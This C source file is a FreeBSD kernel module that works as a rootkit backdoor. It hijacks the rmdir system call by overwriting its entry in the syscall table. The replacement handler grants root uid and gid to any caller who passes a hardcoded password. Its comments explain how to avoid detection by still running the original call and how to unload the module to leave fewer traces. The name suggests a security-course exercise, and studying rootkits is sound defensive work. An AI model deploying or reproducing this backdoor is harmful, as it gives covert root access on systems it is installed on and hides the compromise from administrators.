#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/errno.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/syscallsubr.h>
#include <sys/ucred.h>
#include <sys/signal.h>
#include <sys/types.h>
#include <sys/signalvar.h>

/* Escalate the current thread and its associated process to root. */
static void
escalate(struct thread *td) {

    td->td_ucred->cr_uid =          /* effective user id */
        td->td_ucred->cr_ruid =     /* real user id */
        td->td_ucred->cr_svuid =    /* saved user id */
        td->td_ucred->cr_gid =      /* effective group id */
        td->td_ucred->cr_rgid =     /* real group id */
        td->td_ucred->cr_svgid =    /* saved group id */
        0u;                         /* root id */
}

/* The system call's arguments. */
struct sc_args {
	char *passwd;
};

/* Function pointer to the old syscall function that is being hijacked. */
static sy_call_t *old_sy_call = NULL;

/* The hijacked syscall function will reside in the original
 * sysentry of whichever syscall is being hijacked.
 * It will execute the original syscall with the same args,
 * then it will check if the first argument to the syscall is the
 * privilege escalation password,
 * then it will escalate if the password is correct.
 */
static int
new_sy_call(struct thread *td, void *syscall_args) {

    /* execute the syscall normally and take note of the return value */
    int retval = (*old_sy_call)(td, syscall_args);

    struct sc_args *args = (struct sc_args *) syscall_args;

    /* if no args were passed in, do not proceed since args->passwd is mapped
     * to an invalid page (the first page). */
    if (args->passwd < (char *) 4096) {
        return (retval);
    }

#define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
    if (strcmp(args->passwd, PRIV_ESC_PASSWD) == 0) {
        escalate(td);
    }

    return (retval);
}

/* This system call will overwrite the syscall function handler
 * of another pre-existing/currently valid syscall.
 * The reason why we do the hijacking within a syscall itself is because
 * a syscall gets passed a struct thread, which contains its associated
 * struct proc, which contains a pointer to the sysentry array (struct
 * sysentvec), which contains a pointer to the system call entry table
 * (sv_table), which is an array of struct sysents.
 * This syscall module should be unloaded after this function is called to
 * minimize traces of its existence (since it would have already hijacked
 * another syscall and achieved its purpose).
 * The best syscalls to hijack are the ones that require only
 * one char* argument.
 * See /sys/kern/syscalls.master for a list of such suitable syscalls.
 */
static int
hijack_syscall(struct thread *td, void *syscall_args) {

/* rmdir syscall 137. */
#define HIJACKED_SYSCALL 137

    /* record the old syscall so that the hijacked syscall can still execute
     * it (to avoid detection) and act as if the syscall is still working. */
    old_sy_call = td->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;

    /* redirect the entry to point to the new syscall handler. */
    td->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;

	return (0);
}

/* The sysent for the hijacker system call. */
static struct sysent hijack_sysent = {
	0,              /* number of arguments */
	hijack_syscall  /* implementing function */
};

/* The offset in sysent[] where the hijacker system call is to be allocated. */
/* NO_SYSCALL means load into the first available slot for loadable syscalls. */
static int offset = NO_SYSCALL;

/* The function called when the hijacker syscall is loaded/unloaded. */
static int
load(struct module *module, int cmd, void *arg) {
    return (0);
}

SYSCALL_MODULE(hijack_syscall, &offset, &hijack_sysent, load, NULL);
